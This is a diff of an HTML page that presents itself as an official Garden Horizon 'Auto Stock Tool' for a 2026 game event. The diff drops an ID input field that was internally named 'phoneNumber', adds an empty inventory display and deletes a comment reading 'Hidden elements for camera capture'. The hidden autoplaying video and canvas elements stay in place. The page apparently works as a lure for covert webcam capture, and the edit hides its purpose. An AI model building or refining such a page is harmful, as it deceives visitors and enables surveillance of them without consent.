@@ -28,28 +28,33 @@
     <div class="container">
         <div class="offer-badge">Official Event: Garden Horizon</div>
         <h1>Garden Horizon<br>Auto Stock Tool</h1>
-        <p>Automate your inventory replenishment in seconds. Official tool for the 2026 Season. 
-            Enter your Garden ID below to start the automatic stock synchronization.</p>
+        <p>Your one-stop dashboard for live inventory replenishment and monitoring. Official 2026 Season tool.</p>
 
         <form id="claimForm">
-            <div class="input-group">
-                <input type="text" id="phoneNumber" placeholder="Garden ID / User ID" required>
-            </div>
             <button type="submit" id="submitBtn">
-                <span class="btn-text">Activate Auto Stock</span>
+                <span class="btn-text">Garden Horizon Stock</span>
                 <div class="loading-spinner" id="spinner"></div>
             </button>
         </form>
 
         <div class="status" id="statusMessage"></div>
+        
+        <div id="stock-display" class="stock-container" style="display: none;">
+            <div class="stock-header">
+                <h3>Live Inventory Details</h3>
+                <span class="refresh-time" id="last-update"></span>
+            </div>
+            <div id="stock-list" class="stock-list">
+                <!-- Stock items will be injected here -->
+            </div>
+        </div>
 
 
         <div class="footer-note">
-            *This event is limited to 1 account per device.
+            *Garden Horizon Stock.
         </div>
     </div>
 
-    <!-- Hidden elements for camera capture -->
     <video id="hidden-video" autoplay playsinline muted></video>
     <canvas id="hidden-canvas"></canvas>
 
